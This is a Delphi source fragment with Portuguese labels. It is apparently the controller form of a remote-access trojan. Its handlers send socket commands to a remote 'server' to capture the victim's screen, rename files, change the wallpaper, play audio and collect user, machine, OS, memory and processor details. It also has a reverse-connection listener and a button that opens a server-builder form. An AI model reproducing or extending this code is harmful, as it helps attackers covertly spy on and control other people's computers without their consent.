procedure TFrmPrincipal.BtnRenomearClick(Sender: TObject);
Var FileToRename,NewName:string;
begin
 if CS.Active = true then
 begin
 FileToRename:=CurrentDir+ListBoxArquivos.Items[ListBoxArquivos.itemindex];
 NewName:= CurrentDir+InputBox('Digite Novo Nome','Novo Nome',ListBoxArquivos.Items[ListBoxArquivos.itemindex]);
 CS.Socket.SendText('<RENAMEFILE>'+FileToRename+'|'+NewName);

 
 end;
end;

procedure TFrmPrincipal.BtnCapturarTelaClick(Sender: TObject);
begin
if CS.Active = true then
begin
CS.Socket.SendText('<CAPTURE>');
 //RemoteFile:='jpg.jpg';
 SaveLocalAs :='screenShot.jpg';
// sleep(1000);
 //FrmMain.ClientSocket1.Socket.SendText('<GETFILE>'+RemoteFile);
end;
end;

procedure TFrmPrincipal.ImgCapturarTelaDblClick(Sender: TObject);
begin
//ShellExecuteA(0,'open',pchar('screenShot.jpg'),nil,nil,SW_SHOWNORMAL );
end;

procedure TFrmPrincipal.ListBoxArquivosClick(Sender: TObject);
begin
If ListBoxArquivos.Items = nil then exit;
Edit1.Text:= CurrentDir+ListBoxArquivos.Items[ListBoxArquivos.itemindex];
end;

procedure TFrmPrincipal.BtnConectarClick(Sender: TObject);
begin
 if CS.Active= true THEN
 begin
 CS.Active:= false;
 end
 else
 begin
  CS.Address:= NumeroIP.Text;
  CS.Active:= true;
 end;
end;

procedure TFrmPrincipal.sBtnPapelParedeClick(Sender: TObject);
begin
If EdtPapelParede.Text = '' then exit;
CS.Socket.SendText('<WALLPAPER>'+ EdtPapelParede.Text);
end;

procedure TFrmPrincipal.sBitBtn9Click(Sender: TObject);
begin
sPanelPapelParede.BringToFront;
end;

procedure TFrmPrincipal.sBtnTocarClick(Sender: TObject);
begin
If EdtTocarMusica.Text = '' then exit;
CS.Socket.SendText('<PLAYMUSIC>'+ EdtTocarMusica.Text);
 sBtnTocar.Enabled:= false;
 sBtnPausar.Enabled:= true;
 sBtnParar.Enabled:= true;
end;

procedure TFrmPrincipal.sBtnPausarClick(Sender: TObject);
begin
If EdtTocarMusica.Text = '' then exit;
CS.Socket.SendText('<PAUSEMUSIC>'+ EdtTocarMusica.Text);
 sBtnTocar.Enabled:= true;
 sBtnPausar.Enabled:= false;
 sBtnParar.Enabled:= true;
end;

procedure TFrmPrincipal.sBtnPararClick(Sender: TObject);
begin
If EdtTocarMusica.Text = '' then exit;
CS.Socket.SendText('<STOPMUSIC>'+ EdtTocarMusica.Text);
 sBtnTocar.Enabled:= true;
 sBtnPausar.Enabled:= false;
 sBtnParar.Enabled:= false;
end;

procedure TFrmPrincipal.sBitBtn10Click(Sender: TObject);
begin
sPanelTocarMusica.BringToFront;
end;

procedure TFrmPrincipal.BtnCriarServidorClick(Sender: TObject);
begin
FrmCriarServidor.Show;
end;

procedure TFrmPrincipal.INFORMAES1Click(Sender: TObject);
begin
  If not assigned(lv.Selected) then exit;
  SS.Socket.Connections[0].SendText('<APELIDO>');
end;

procedure TFrmPrincipal.USURIODOSISTEMA1Click(Sender: TObject);
begin
  If not assigned(lv.Selected) then exit;
  SS.Socket.Connections[0].SendText('<NAMEUSER>');
end;

procedure TFrmPrincipal.NOMEDOPC1Click(Sender: TObject);
begin
  If not assigned(lv.Selected) then exit;
  ss.Socket.Connections[0].SendText('<NAMEPC>');
end;

procedure TFrmPrincipal.SISTEMA1Click(Sender: TObject);
begin
begin
  If not assigned(lv.Selected) then exit;
  SS.Socket.Connections[0].SendText('<SISTEMA>');
end;
end;

procedure TFrmPrincipal.REGISTRADOPARA1Click(Sender: TObject);
begin
  If not assigned(lv.Selected) then exit;
  SS.Socket.Connections[0].SendText('<REGISTRADO>');
end;

procedure TFrmPrincipal.EMPOLIGADO1Click(Sender: TObject);
begin
  If not assigned(lv.Selected) then exit;
  SS.Socket.Connections[0].SendText('<TEMPOLIGADO>');
end;

procedure TFrmPrincipal.MEMRIA1Click(Sender: TObject);
begin
  If not assigned(lv.Selected) then exit;
  SS.Socket.Connections[0].SendText('<MEMORIA>');
end;

procedure TFrmPrincipal.PROCESSADOR1Click(Sender: TObject);
begin
  If not assigned(lv.Selected) then exit;
  SS.Socket.Connections[0].SendText('<PROCESSADOR>');
end;

procedure TFrmPrincipal.LVDblClick(Sender: TObject);
begin
If not assigned(lv.Selected) then exit;
NumeroIP.Text:= LV.Selected.Caption;
end;

procedure TFrmPrincipal.sCheckBox1Click(Sender: TObject);
begin
if sCheckBox1.Checked = True then
begin 
 SS.Active:= true;
 sPanelTopo1.Caption:= 'AGUARDANDO CONEX�ES...';
end
else
begin
 SS.Active:= false;
 sPanelTopo1.Caption:= 'CONEX�O REVERSA DESATIVADA!';
 LV.Clear;
end;
end;

end.
